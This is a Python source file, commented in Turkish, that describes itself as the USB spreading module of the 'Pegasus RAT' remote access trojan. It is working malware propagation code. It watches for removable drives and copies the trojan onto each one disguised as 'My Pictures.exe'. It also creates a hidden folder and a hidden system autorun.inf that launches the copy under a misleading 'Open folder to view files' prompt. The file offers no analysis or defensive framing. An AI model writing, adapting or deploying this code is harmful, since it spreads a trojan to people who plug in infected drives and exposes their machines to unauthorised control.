#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Pegasus RAT USB Yayılma Modülü - Python adaptasyonu
Orijinal C# kodundan uyarlanmıştır
"""

import os
import sys
import time
import shutil
import threading
import platform
import psutil
import subprocess
from pathlib import Path

class USBSpread:
    """
    USB sürücülere otomatik yayılma sınıfı
    """
    
    def __init__(self, agent_path=None, enabled=True):
        self.enabled = enabled
        self.agent_path = agent_path or sys.executable
        self.spread_name = "My Pictures.exe"
        self.folder_name = "My Pictures"
        self.check_interval = 2.522  # Orijinal koddan (2522ms)
        self.running = False
        self.thread = None
        
    def get_removable_drives(self):
        """
        Çıkarılabilir USB sürücüleri tespit eder
        """
        removable_drives = []
        
        try:
            # Windows için
            if platform.system() == "Windows":
                import win32file
                drives = win32file.GetLogicalDrives()
                drive_letters = []
                
                for i in range(26):
                    if drives & (1 << i):
                        drive_letter = chr(65 + i) + ":\\"
                        drive_letters.append(drive_letter)
                
                for drive in drive_letters:
                    try:
                        drive_type = win32file.GetDriveType(drive)
                        # DRIVE_REMOVABLE = 2
                        if drive_type == 2:
                            removable_drives.append(drive)
                    except:
                        continue
            
            # Linux için
            elif platform.system() == "Linux":
                # /media ve /mnt altındaki mount noktalarını kontrol et
                media_paths = ["/media", "/mnt"]
                for media_path in media_paths:
                    if os.path.exists(media_path):
                        for item in os.listdir(media_path):
                            full_path = os.path.join(media_path, item)
                            if os.path.ismount(full_path):
                                # USB sürücü olup olmadığını kontrol et
                                try:
                                    with open("/proc/mounts", "r") as f:
                                        mounts = f.read()
                                        if full_path in mounts and ("usb" in mounts.lower() or "removable" in mounts.lower()):
                                            removable_drives.append(full_path)
                                except:
                                    continue
            
            # psutil ile alternatif yöntem
            else:
                partitions = psutil.disk_partitions()
                for partition in partitions:
                    if 'removable' in partition.opts or 'usb' in partition.device.lower():
                        removable_drives.append(partition.mountpoint)
                        
        except Exception as e:
            print(f"USB sürücü tespiti hatası: {e}")
        
        return removable_drives
    
    def spread_to_drive(self, drive_path):
        """
        Belirtilen sürücüye agent'ı kopyalar
        """
        try:
            # Hedef dosya yolu
            target_file = os.path.join(drive_path, self.spread_name)
            target_folder = os.path.join(drive_path, self.folder_name)
            
            # Agent dosyasını kopyala
            if os.path.exists(self.agent_path) and os.path.isfile(self.agent_path):
                shutil.copy2(self.agent_path, target_file)
                
                # Dosya kopyalandıysa gizli klasör oluştur
                if os.path.exists(target_file):
                    try:
                        # Gizli klasör oluştur
                        os.makedirs(target_folder, exist_ok=True)
                        
                        # Windows'ta gizli özellik ekle
                        if platform.system() == "Windows":
                            try:
                                subprocess.run([
                                    "attrib", "+H", target_folder
                                ], check=False, capture_output=True)
                            except:
                                pass
                        
                        # Linux'ta nokta ile başlayan gizli klasör
                        elif platform.system() == "Linux":
                            hidden_folder = os.path.join(drive_path, f".{self.folder_name}")
                            if not os.path.exists(hidden_folder):
                                os.makedirs(hidden_folder, exist_ok=True)
                        
                        return True
                        
                    except Exception as e:
                        print(f"Gizli klasör oluşturma hatası: {e}")
                        return False
            
        except Exception as e:
            print(f"USB yayılma hatası ({drive_path}): {e}")
            return False
        
        return False
    
    def create_autorun(self, drive_path):
        """
        USB için autorun.inf dosyası oluşturur (Windows)
        """
        if platform.system() != "Windows":
            return
        
        try:
            autorun_path = os.path.join(drive_path, "autorun.inf")
            autorun_content = f"""[AutoRun]
open={self.spread_name}
icon={self.spread_name}
action=Open folder to view files
label=My Pictures
"""
            
            with open(autorun_path, "w") as f:
                f.write(autorun_content)
            
            # Gizli ve sistem dosyası yap
            try:
                subprocess.run([
                    "attrib", "+H", "+S", autorun_path
                ], check=False, capture_output=True)
            except:
                pass
                
        except Exception as e:
            print(f"Autorun oluşturma hatası: {e}")
    
    def spread_worker(self):
        """
        USB yayılma işçi thread'i
        """
        processed_drives = set()
        
        while self.running:
            try:
                current_drives = set(self.get_removable_drives())
                
                # Yeni USB sürücüler var mı kontrol et
                new_drives = current_drives - processed_drives
                
                for drive in new_drives:
                    if os.path.exists(drive) and os.access(drive, os.W_OK):
                        print(f"Yeni USB sürücü tespit edildi: {drive}")
                        
                        # Agent'ı kopyala
                        if self.spread_to_drive(drive):
                            print(f"USB yayılma başarılı: {drive}")
                            
                            # Windows için autorun oluştur
                            self.create_autorun(drive)
                        
                        processed_drives.add(drive)
                
                # Çıkarılan sürücüleri temizle
                removed_drives = processed_drives - current_drives
                processed_drives -= removed_drives
                
                time.sleep(self.check_interval)
                
            except Exception as e:
                print(f"USB yayılma döngü hatası: {e}")
                time.sleep(self.check_interval)
    
    def start(self):
        """
        USB yayılma servisini başlatır
        """
        if not self.enabled or self.running:
            return False
        
        try:
            self.running = True
            self.thread = threading.Thread(target=self.spread_worker, daemon=True)
            self.thread.start()
            print("USB yayılma servisi başlatıldı")
            return True
        except Exception as e:
            print(f"USB yayılma başlatma hatası: {e}")
            self.running = False
            return False
    
    def stop(self):
        """
        USB yayılma servisini durdurur
        """
        if not self.running:
            return
        
        self.running = False
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=5)
        
        print("USB yayılma servisi durduruldu")
    
    def is_running(self):
        """
        Servisin çalışıp çalışmadığını kontrol eder
        """
        return self.running and self.thread and self.thread.is_alive()

class USBManager:
    """
    USB yayılma yöneticisi
    """
    
    def __init__(self, config=None):
        self.config = config
        self.usb_spread = None
        
    def initialize(self, agent_path=None):
        """
        USB yayılma sistemini başlatır
        """
        try:
            # Konfigürasyondan USB ayarını kontrol et
            usb_enabled = True
            if self.config:
                usb_setting = self.config.get_setting('usb', 'false')
                usb_enabled = usb_setting.lower() == 'true'
            
            if usb_enabled:
                self.usb_spread = USBSpread(agent_path=agent_path, enabled=True)
                return self.usb_spread.start()
            else:
                print("USB yayılma devre dışı")
                return False
                
        except Exception as e:
            print(f"USB yöneticisi başlatma hatası: {e}")
            return False
    
    def cleanup(self):
        """
        USB yayılma sistemini temizler
        """
        if self.usb_spread:
            self.usb_spread.stop()
            self.usb_spread = None
    
    def get_status(self):
        """
        USB yayılma durumunu döndürür
        """
        if self.usb_spread:
            return {
                'enabled': True,
                'running': self.usb_spread.is_running(),
                'agent_path': self.usb_spread.agent_path
            }
        else:
            return {
                'enabled': False,
                'running': False,
                'agent_path': None
            }

# Test fonksiyonu
if __name__ == "__main__":
    print("Pegasus USB Yayılma Testi")
    
    # USB sürücüleri listele
    usb_spread = USBSpread(enabled=False)  # Test için devre dışı
    drives = usb_spread.get_removable_drives()
    print(f"Tespit edilen USB sürücüler: {drives}")
    
    # USB yöneticisi testi
    manager = USBManager()
    status = manager.get_status()
    print(f"USB Yöneticisi Durumu: {status}")
